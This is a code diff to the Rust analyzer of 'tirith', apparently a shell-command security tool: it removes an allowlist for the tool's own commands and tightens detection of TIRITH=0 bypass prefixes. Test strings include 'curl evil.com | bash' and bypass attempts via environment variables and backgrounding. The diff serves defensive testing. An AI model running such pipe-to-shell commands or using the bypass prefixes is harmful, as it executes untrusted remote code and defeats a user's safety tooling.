@@ -58,6 +58,13 @@ fn is_tirith_zero_assignment(word: &str) -> bool {
 fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     use crate::tokenize;
 
+    if matches!(shell, ShellType::Posix | ShellType::Fish) {
+        let segments = tokenize::tokenize(input, shell);
+        if segments.len() != 1 || has_unquoted_ampersand(input, shell) {
+            return false;
+        }
+    }
+
     let words = split_raw_words(input, shell);
     if words.is_empty() {
         return false;
@@ -97,8 +104,7 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
                 }
                 if w.starts_with('-') {
                     if w.starts_with("--") {
-                        // Long flags: --unset=VAR (skip) or --unset VAR (skip next)
-                        if !w.contains('=') {
+                        if env_long_flag_takes_value(w) && !w.contains('=') {
                             idx += 2;
                         } else {
                             idx += 1;
@@ -163,6 +169,11 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     }
 
     false
+}
+
+fn env_long_flag_takes_value(flag: &str) -> bool {
+    let name = flag.split_once('=').map(|(name, _)| name).unwrap_or(flag);
+    matches!(name, "--unset" | "--chdir" | "--split-string")
 }
 
 /// Check if a word is `$env:TIRITH=0` with optional quotes around the value.
@@ -260,6 +271,7 @@ fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
             }
             '|' | '\n' | '&' => break, // Stop at segment boundary
             ';' if shell != ShellType::Cmd => break,
+            '#' if shell == ShellType::PowerShell => break,
             '\'' if shell != ShellType::Cmd => {
                 current.push(ch);
                 i += 1;
@@ -351,158 +363,6 @@ fn has_unquoted_ampersand(input: &str, shell: ShellType) -> bool {
     false
 }
 
-/// Check if the input is a self-invocation of tirith (single-segment only).
-/// Returns true if the resolved command is `tirith` itself.
-fn is_self_invocation(input: &str, shell: ShellType) -> bool {
-    use crate::tokenize;
-
-    // Must be single segment (no pipes, &&, etc.)
-    let segments = tokenize::tokenize(input, shell);
-    if segments.len() != 1 {
-        return false;
-    }
-
-    // Reject if input contains unquoted `&` — backgrounding creates a separate
-    // command after the `&` that would bypass analysis (tokenize_posix does not
-    // treat single `&` as a segment separator, so the segments check above misses it).
-    if has_unquoted_ampersand(input, shell) {
-        return false;
-    }
-
-    let words = split_raw_words(input, shell);
-    if words.is_empty() {
-        return false;
-    }
-
-    // Skip leading VAR=VALUE
-    let mut idx = 0;
-    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-        idx += 1;
-    }
-    if idx >= words.len() {
-        return false;
-    }
-
-    let cmd = &words[idx];
-    let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd);
-    let cmd_base = cmd_base.trim_matches(|c: char| c == '\'' || c == '"');
-
-    // Try to resolve wrappers (one level)
-    let resolved = match cmd_base {
-        "env" => resolve_env_wrapper(&words[idx + 1..]),
-        "command" => resolve_command_wrapper(&words[idx + 1..]),
-        "time" => resolve_time_wrapper(&words[idx + 1..]),
-        other => Some(other.to_string()),
-    };
-
-    match resolved {
-        Some(ref cmd_name) => is_tirith_command(cmd_name),
-        None => false,
-    }
-}
-
-/// Resolve through `env` wrapper: skip options, VAR=VALUE, find command.
-fn resolve_env_wrapper(args: &[String]) -> Option<String> {
-    use crate::tokenize;
-    let mut i = 0;
-    while i < args.len() {
-        let w = &args[i];
-        if w == "--" {
-            i += 1;
-            break;
-        }
-        if tokenize::is_env_assignment(w) {
-            i += 1;
-            continue;
-        }
-        if w.starts_with('-') {
-            if w.starts_with("--") {
-                // Long flags: --unset=VAR (skip) or --unset VAR (skip next)
-                if !w.contains('=') {
-                    i += 2;
-                } else {
-                    i += 1;
-                }
-                continue;
-            }
-            // Short flags that take a separate value arg
-            if w == "-u" || w == "-C" || w == "-S" {
-                i += 2;
-                continue;
-            }
-            i += 1;
-            continue;
-        }
-        // First non-option, non-assignment is the command
-        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
-    }
-    // After --, skip remaining VAR=VALUE to find command
-    while i < args.len() {
-        let w = &args[i];
-        if tokenize::is_env_assignment(w) {
-            i += 1;
-            continue;
-        }
-        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
-    }
-    None
-}
-
-/// Resolve through `command` wrapper: skip flags like -v, -p, -V, then `--`, take next arg.
-fn resolve_command_wrapper(args: &[String]) -> Option<String> {
-    let mut i = 0;
-    // Skip flags like -v, -p, -V
-    while i < args.len() && args[i].starts_with('-') && args[i] != "--" {
-        i += 1;
-    }
-    // Skip -- if present
-    if i < args.len() && args[i] == "--" {
-        i += 1;
-    }
-    if i < args.len() {
-        let w = &args[i];
-        Some(w.rsplit('/').next().unwrap_or(w).to_string())
-    } else {
-        None
-    }
-}
-
-/// Resolve through `time` wrapper: skip -prefixed flags, take next non-flag.
-fn resolve_time_wrapper(args: &[String]) -> Option<String> {
-    let mut i = 0;
-    while i < args.len() {
-        let w = &args[i];
-        if w == "--" {
-            i += 1;
-            break;
-        }
-        if w.starts_with('-') {
-            // -f/--format and -o/--output consume the next argument
-            if w == "-f" || w == "--format" || w == "-o" || w == "--output" {
-                i += 2;
-            } else if w.starts_with("--") && w.contains('=') {
-                i += 1; // --format=FMT, --output=FILE — single token
-            } else {
-                i += 1;
-            }
-            continue;
-        }
-        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
-    }
-    // After `--`, the next arg is the command
-    if i < args.len() {
-        let w = &args[i];
-        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
-    }
-    None
-}
-
-/// Check if a command name is tirith (literal match).
-/// Note: callers already strip path prefixes via rsplit('/'), so only basename arrives here.
-fn is_tirith_command(cmd: &str) -> bool {
-    cmd == "tirith"
-}
-
 /// Run the tiered analysis pipeline.
 pub fn analyze(ctx: &AnalysisContext) -> Verdict {
     let start = Instant::now();
@@ -557,21 +417,6 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
 
     // If nothing triggered, fast exit
     if !byte_scan_triggered && !regex_triggered && !exec_bidi_triggered {
-        let total_ms = start.elapsed().as_secs_f64() * 1000.0;
-        return Verdict::allow_fast(
-            1,
-            Timings {
-                tier0_ms,
-                tier1_ms,
-                tier2_ms: None,
-                tier3_ms: None,
-                total_ms,
-            },
-        );
-    }
-
-    // Self-invocation guard: allow tirith's own commands (single-segment only)
-    if ctx.scan_context == ScanContext::Exec && is_self_invocation(&ctx.input, ctx.shell) {
         let total_ms = start.elapsed().as_secs_f64() * 1000.0;
         return Verdict::allow_fast(
             1,
@@ -1198,7 +1043,7 @@ mod tests {
     #[test]
     fn test_inline_bypass_bare_prefix() {
         assert!(find_inline_bypass(
-            "TIRITH=0 curl evil.com | bash",
+            "TIRITH=0 curl evil.com",
             ShellType::Posix
         ));
     }
@@ -1317,60 +1162,10 @@ mod tests {
     }
 
     #[test]
-    fn test_self_invocation_simple() {
-        assert!(is_self_invocation(
-            "tirith diff https://example.com",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_self_invocation_env_wrapper() {
-        assert!(is_self_invocation(
-            "env -u PATH tirith diff url",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_self_invocation_command_dashdash() {
-        assert!(is_self_invocation(
-            "command -- tirith diff url",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_self_invocation_time_p() {
-        assert!(is_self_invocation(
-            "time -p tirith diff url",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_not_self_invocation_multi_segment() {
-        assert!(!is_self_invocation(
-            "tirith diff url | bash",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_not_self_invocation_other_cmd() {
-        assert!(!is_self_invocation(
-            "curl https://evil.com",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_not_self_invocation_background_bypass() {
-        // `tirith & malicious` backgrounds tirith and runs malicious separately;
-        // must NOT be treated as self-invocation
-        assert!(!is_self_invocation(
-            "tirith & curl evil.com",
-            ShellType::Posix
+    fn test_no_inline_bypass_powershell_comment_contains_bypass() {
+        assert!(!find_inline_bypass(
+            "curl evil.com # $env:TIRITH=0",
+            ShellType::PowerShell
         ));
     }
 
@@ -1393,19 +1188,21 @@ mod tests {
     }
 
     #[test]
-    fn test_self_invocation_env_c_flag() {
-        // env -C /tmp tirith should resolve through -C's value arg
-        assert!(is_self_invocation(
-            "env -C /tmp tirith diff url",
+    fn test_inline_bypass_env_ignore_environment_long_flag() {
+        assert!(find_inline_bypass(
+            "env --ignore-environment TIRITH=0 curl evil.com",
             ShellType::Posix
         ));
     }
 
     #[test]
-    fn test_not_self_invocation_env_c_misidentify() {
-        // env -C /tmp curl — should NOT be identified as self-invocation
-        assert!(!is_self_invocation(
-            "env -C /tmp curl evil.com",
+    fn test_no_inline_bypass_for_chained_posix_command() {
+        assert!(!find_inline_bypass(
+            "TIRITH=0 curl evil.com | bash",
+            ShellType::Posix
+        ));
+        assert!(!find_inline_bypass(
+            "TIRITH=0 curl evil.com & bash",
             ShellType::Posix
         ));
     }
@@ -1486,7 +1283,7 @@ mod tests {
     #[test]
     fn test_inline_bypass_single_quoted_value() {
         assert!(find_inline_bypass(
-            "TIRITH='0' curl evil.com | bash",
+            "TIRITH='0' curl evil.com",
             ShellType::Posix
         ));
     }
@@ -1494,9 +1291,38 @@ mod tests {
     #[test]
     fn test_inline_bypass_double_quoted_value() {
         assert!(find_inline_bypass(
-            "TIRITH=\"0\" curl evil.com | bash",
+            "TIRITH=\"0\" curl evil.com",
             ShellType::Posix
         ));
+    }
+
+    #[test]
+    fn test_tirith_command_is_analyzed_like_any_other_exec() {
+        let ctx = AnalysisContext {
+            input: "tirith run http://example.com".to_string(),
+            shell: ShellType::Posix,
+            scan_context: ScanContext::Exec,
+            raw_bytes: None,
+            interactive: true,
+            cwd: None,
+            file_path: None,
+            repo_root: None,
+            is_config_override: false,
+            clipboard_html: None,
+        };
+
+        let verdict = analyze(&ctx);
+        assert!(
+            verdict.tier_reached >= 3,
+            "user-typed tirith commands should still be analyzed"
+        );
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::PlainHttpToSink)),
+            "tirith run http://... should surface sink findings"
+        );
     }
 
     #[test]
